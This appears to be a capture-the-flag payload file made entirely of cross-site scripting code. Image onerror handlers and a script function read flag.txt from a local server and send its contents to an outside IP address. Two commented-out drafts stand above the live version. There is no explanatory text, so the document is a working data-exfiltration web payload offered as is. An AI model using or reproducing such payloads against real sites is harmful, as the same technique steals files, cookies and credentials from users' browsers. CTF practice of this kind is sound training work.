//<img src=x onerror="fetch('http://10.17.10.89:8080')"/>


//<img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt') 
  //.then(response => response.text())
  //.then(data => fetch('http://10.17.10.89:8080?flag=' + encodeURIComponent(data)))"/>


<img src="x" onerror="exfiltrateFlag()"/>

<script>
function exfiltrateFlag() {
    fetch('http://127.0.0.1:8080/flag.txt')
        .then(function(response) {
            return response.text();
        })
        .then(function(data) {
            fetch('http://10.17.10.89:8080?flag=' + encodeURIComponent(data));
        });
}
</script>
